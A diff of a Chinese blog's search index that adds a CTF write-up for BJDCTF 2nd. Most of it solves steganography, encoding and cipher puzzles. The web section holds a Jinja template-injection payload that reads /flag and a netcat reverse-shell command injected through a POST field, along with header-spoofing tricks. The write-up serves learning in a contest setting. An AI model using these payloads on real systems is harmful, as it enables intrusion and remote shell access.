@@ -1,6 +1,141 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>BJDCTF-2nd-wp</title>
+    <url>/2020/03/21/BJDCTF-2nd-wp/</url>
+    <content><![CDATA[<p>title: BJDCTF-2nd-wp<br>date: 2020-03-21 17:15:53<br>tags: </p>
+<ul>
+<li>Write_up</li>
+<li>misc</li>
+<li>crypto<br>categories: </li>
+<li>misc</li>
+<li>crypto<br>cover: <a href="https://images.pexels.com/photos/212286/pexels-photo-212286.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=3&amp;h=750&amp;w=1260" target="_blank" rel="noopener">https://images.pexels.com/photos/212286/pexels-photo-212286.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=3&amp;h=750&amp;w=1260</a></li>
+</ul>
+<p>上周六，第二届BJD在buuoj上举行了，去水了一下，在这里写一些misc和crypto的wp吧（别问，问就是web基本不会</p>
+<p>[TOC]</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="最简单的misc-y1ng"><a href="#最简单的misc-y1ng" class="headerlink" title="最简单的misc-y1ng"></a>最简单的misc-y1ng</h3><p>思路：伪加密+补全文件头+16进制转ASCII</p>
+<p>09-&gt;00，补全文件头89 50 4E 47，得到下图</p>
+<a href="/2020/03/21/BJDCTF-2nd-wp/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/1.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>将下面那一行转换为ASCII后得到flag：<code>BJD{y1ngzuishuai}</code></p>
+<h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p>思路：png高度修改</p>
+<a href="/2020/03/21/BJDCTF-2nd-wp/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/21/BJDCTF-2nd-wp/2.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>开始没想修改高度，直接放到slover了啥也没发现，然后用zsteg没法发现隐写，最后去改了高度</p>
+<p>得到flag：<code>BJD{PnG_He1ghT_1s_WR0ng}</code></p>
+<h3 id="EasyBaBa"><a href="#EasyBaBa" class="headerlink" title="EasyBaBa"></a>EasyBaBa</h3><p>思路：foremost分离+改文件格式+视频逐帧+二维码反色+16进制转ASCII</p>
+<p>foremost分离出了一个zip，解压得到一个jpg，格式不正确，file一下发现是avi，改后缀</p>
+<p>近期钉钉“求饶”视频，但是里面混进去一些图片，pr，ae，ff不会用。。（所以我选择迅雷</p>
+<p>逐帧查看后发现四张图片</p>
+<p><a href="/2020/03/21/BJDCTF-2nd-wp/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/3.png" src="/img/loading.gif" class="lazyload"></a><a href="/2020/03/21/BJDCTF-2nd-wp/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/4.png" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/2020/03/21/BJDCTF-2nd-wp/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/5.png" src="/img/loading.gif" class="lazyload"></a><a href="/2020/03/21/BJDCTF-2nd-wp/6.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/6.png" src="/img/loading.gif" class="lazyload"></a></p>
+<p>前三张反色完，要不PsQREdit，要不Barcode Reader都能扫出来</p>
+<p>但是第4张中间有、糊，于是掏出QRazyBox自己拼了一张</p>
+<a href="/2020/03/21/BJDCTF-2nd-wp/7.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/7.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>最后把扫出来的字符串拼起来得到<code>6167696E5F6C  6F76655F59  424A447B696D  316E677D</code></p>
+<p>16进制转ASCII后调整一下顺序得到flag：<code>BJD{imagin_love_Y1ng}</code></p>
+<h3 id="小姐姐-y1ng"><a href="#小姐姐-y1ng" class="headerlink" title="小姐姐-y1ng"></a>小姐姐-y1ng</h3><p>思路：直接010里搜BJD</p>
+<p>u1s1，图不错，这题卡了半天</p>
+<p>刚开始拿stegdetect分析了一下，以为是jphide。。然后因为不知道密码是啥就一直卡住了，break爆破也爆不出来</p>
+<a href="/2020/03/21/BJDCTF-2nd-wp/8.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/8.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>最后去010里面搜了一下BJD。。（人傻了</p>
+<a href="/2020/03/21/BJDCTF-2nd-wp/9.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/9.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>得到flag：<code>BJD{haokanma_xjj}</code></p>
+<h3 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real_EasyBaBa"></a>Real_EasyBaBa</h3><p>思路：010里面看flag形状（抽象带师。。</p>
+<p>打开010，往下拉</p>
+<a href="/2020/03/21/BJDCTF-2nd-wp/10.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/21/BJDCTF-2nd-wp/10.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>得到flag：<code>BJD{572154976}</code></p>
+<h3 id="圣火昭昭-y1ng"><a href="#圣火昭昭-y1ng" class="headerlink" title="圣火昭昭-y1ng"></a>圣火昭昭-y1ng</h3><p>思路：新佛曰+outguess隐写</p>
+<p>看属性发现新佛曰，<a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">解码</a>一下（得到key：gemlove，题目提示去掉com</p>
+<a href="/2020/03/21/BJDCTF-2nd-wp/11.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/11.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>然后根据题目hint：<code>开局一张图，flag全靠猜</code>     暗示outguess隐写</p>
+<p>其实刚开始我没理解这意思，然后用stegdetect扫<code>error: Quantization table 0x00 was not defined</code></p>
+<p>打开010看一下，发现大量00，20明示outguess隐写</p>
+<a href="/2020/03/21/BJDCTF-2nd-wp/12.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/12.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>解出来得到flag：<code>BJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}</code></p>
+<h3 id="TARGZ-y1ng"><a href="#TARGZ-y1ng" class="headerlink" title="TARGZ-y1ng"></a>TARGZ-y1ng</h3><p>思路：文件名为压缩包密码，多层压缩包解密</p>
+<p>这题是给新生的？？记得前一阵子跟楠子哥去水Sarctf的时候就遇到过这b题，当时拆自闭了，后来也没管</p>
+<p>看一了眼出题人，去<a href="https://www.gem-love.com/ctf/1471.html" target="_blank" rel="noopener">师傅博客</a>瞅了瞅，果然打Sarctf了。。当时的是无后缀zip</p>
+<p>这波是有后缀.tar.gz，发现脚本，想改改，发现自己不会改。。</p>
+<p>贴一下群里Orge师傅的bash脚本</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> [ -e *.tar.gz ]; <span class="keyword">do</span></span><br><span class="line">  files=*.tar.gz;</span><br><span class="line">  <span class="keyword">for</span> file <span class="keyword">in</span> <span class="variable">$files</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">"Cracking <span class="variable">$&#123;file&#125;</span>… "</span>;</span><br><span class="line">    password=<span class="variable">$&#123;file%%.*&#125;</span></span><br><span class="line">    <span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$&#123;password&#125;</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"Failed to find password"</span>;</span><br><span class="line">      <span class="built_in">break</span> 2;</span><br><span class="line">    <span class="keyword">fi</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Found password: \`<span class="variable">$&#123;password&#125;</span>\`"</span>;</span><br><span class="line">    unzip -q -P <span class="string">"<span class="variable">$&#123;password&#125;</span>"</span> <span class="string">"<span class="variable">$file</span>"</span>;</span><br><span class="line">    rm <span class="string">"<span class="variable">$&#123;file&#125;</span>"</span>;</span><br><span class="line">  <span class="keyword">done</span>;</span><br><span class="line"><span class="keyword">done</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>py脚本有时间补一哈</p>
+<p>最后得到flag：<code>BJD{wow_you_can_rea11y_dance}</code></p>
+<h3 id="Imagin-开场曲"><a href="#Imagin-开场曲" class="headerlink" title="Imagin - 开场曲"></a>Imagin - 开场曲</h3><p>思路：玩mikutap，根据键盘键位打出相似的拍子，然后移位得到密码</p>
+<p>hint：</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">大写</span><br><span class="line">mikutap</span><br><span class="line">开场曲重复了两遍</span><br><span class="line">flag交一遍的就行</span><br><span class="line">格式BJD&#123;字母+数字&#125;</span><br><span class="line">数字范围0-5</span><br></pre></td></tr></table></figure></div>
+
+<p>（横，圈点，实心方块）x 2+ （叉，空心方块，实心散布圆，空心散布圆，实心方块，空心多边形，实心多边形）x 2+  （中心出发圆，中心出发圆，空心多边形，中心出发圆）x 2 </p>
+<p>听就完事了…..最后得到flag：<code>BJD{MIKUTAP3313313}</code></p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>做的全是1分的嗷，菜鸡不愿去找RSA脚本了</p>
+<h3 id="签到-y1ng"><a href="#签到-y1ng" class="headerlink" title="签到-y1ng"></a>签到-y1ng</h3><p>QkpEe1czbGMwbWVfVDBfQkpEQ1RGfQ==</p>
+<p>base64解码得到flag：<code>BJD{W3lc0me_T0_BJDCTF}</code></p>
+<h3 id="老文盲了"><a href="#老文盲了" class="headerlink" title="老文盲了"></a>老文盲了</h3><p>这题给爷整笑了，百度翻译读一下</p>
+<p>去掉BJD{}对应的字，得到flag：<code>BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}</code></p>
+<h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h3><a href="/2020/03/21/BJDCTF-2nd-wp/13.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/13.gif" src="/img/loading.gif" class="lazyload"></a>
+
+<p>拿🍙的是0，拿🍗的是1，翻译一下，二进制转ASCII</p>
+<p>得到flag：<code>BJD{M!a0~}</code></p>
+<h3 id="灵能精通-y1ng"><a href="#灵能精通-y1ng" class="headerlink" title="灵能精通-y1ng"></a>灵能精通-y1ng</h3><a href="/2020/03/21/BJDCTF-2nd-wp/14.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/21/BJDCTF-2nd-wp/14.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>圣堂武士密码，翻译一哈，flag：<code>BJD{IMKNIGHTSTEMPLAR}</code></p>
+<h3 id="燕言燕语"><a href="#燕言燕语" class="headerlink" title="燕言燕语"></a>燕言燕语</h3><p>16进制转ASCII+维吉尼亚密码</p>
+<a href="/2020/03/21/BJDCTF-2nd-wp/16.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/16.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>得到flag：<code>bjd{yanzi_jiushige_shabi}</code></p>
+<h3 id="Y1nglish-y1ng"><a href="#Y1nglish-y1ng" class="headerlink" title="Y1nglish-y1ng"></a>Y1nglish-y1ng</h3><p>本来以为这题是词频分析，然后直接上脚本，还把字母顺序和最常出现字母顺序对应了一下，然并卵</p>
+<p>最后收到群里师傅的启发用<a href="www.quipqiup.com">quipquip</a>（解一些简单替换密码，其中MIH明显对应BJD</p>
+<p>hint中提示都是英文单词，所以把y替换成k</p>
+<p>最后得到flag：<code>BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck}</code></p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><p>SSTI模板注入</p>
+<p>随意输一个数字在网页源代码出看到提示</p>
+<a href="/2020/03/21/BJDCTF-2nd-wp/17.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/17.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>不会，根据<a href="www.1p0ch.cn">王牌辅助楠子神</a>给的提示，搜SSTI模板注入，大概看懂了点，讲也讲不出来，直接放payload</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">markdown</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">qaq?name=&#123;&#123;().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">177</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>.<span class="strong">__builtins__</span>[<span class="string">'open'</span>](<span class="link">'/flag'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>还有参考的<a href="https://www.cnblogs.com/20175211lyz/p/11425368.html" target="_blank" rel="noopener">师傅的博客</a></p>
+<h3 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h3><p>开始是个vim文件泄露，而且没走寻常路，dirsearch也没扫出来</p>
+<p>备份文件在/.index.php.swp里，vim -r  恢复一下</p>
+<a href="/2020/03/21/BJDCTF-2nd-wp/18.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/18.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>起初以为是个RCE，绕倒是不难，但是它没回显。。</p>
+<p>于是就开始了我漫长的，弹shell之路。试过bash，python，curl，perl，nc…..</p>
+<p>应该是我姿势不对。。在比赛结束后Yoshino-s师傅在群里的一句<code>nc ip port -e sh</code>点醒了我。。</p>
+<p>接下来就是反弹个shell，在里面找flag就好了</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#自己起的basic linux labs</span></span><br><span class="line">ifconfig</span><br><span class="line">nc -lvp port</span><br><span class="line"><span class="comment">#post的数据</span></span><br><span class="line">girl_friend=nc ip port -e sh</span><br></pre></td></tr></table></figure></div>
+
+<p>最后在<code>./etc/demo/P3rh4ps/love/you</code>中找到flag</p>
+<h3 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h3><p>这是一道考HTTP头的题</p>
+<p>包含了：Client-ip、Referer、From、Cookie、UA还有Via</p>
+<p>先随便登录后查看源代码，提示存在L0g1n.php，进去之后就一层层绕就完事了</p>
+<p>XFF被ban了，可以构造Client-ip</p>
+<p>UA谷歌一下发现是国外的一道原题，包含Commodore 64就好</p>
+<p>最后卡到Via好久，一直以为是Proxy-Authorization要去爆破用户名加密码的base64，失败了。</p>
+<p>后来看到群里师傅发的截图才知道Via</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添加 Via 头部，并填上自己的相关信息，当下一个代理服务器 收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的Via 头部，并把自己的相关信息加到后面， 以此类推，当 OCS 收到最后一个代理服务器的请求时，检查 Via 头部，就知道该请求所经过的路由。</span><br></pre></td></tr></table></figure></div>
+
+<p>再开环境做了一遍得到flag</p>
+<a href="/2020/03/21/BJDCTF-2nd-wp/19.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/19.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>&nbsp;</p>
+<p>这是新生赛？？让我深刻地认识到自己连新生都不如了。（我感觉BJD 1st 也不简单</p>
+<p>慢慢来吧，转转型，misc是兴趣，web是饭碗（hhh</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>upload-labs</title>
+    <url>/2020/03/20/upload-labs/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>高校战&quot;疫&quot;-misc-wp</title>
     <url>/2020/03/09/xctf-misc-wp/</url>
     <content><![CDATA[<h3 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h3><p>虽然计网和OS作业还没写，但是奈何不想写啊。。。于是就写篇博客玩吧。。。。</p>
@@ -224,6 +359,7 @@
 <a id="more"></a>
 
 <p>不着急，有时间就写</p>
+<p>太多了，先咕着</p>
 ]]></content>
       <categories>
         <category>misc</category>
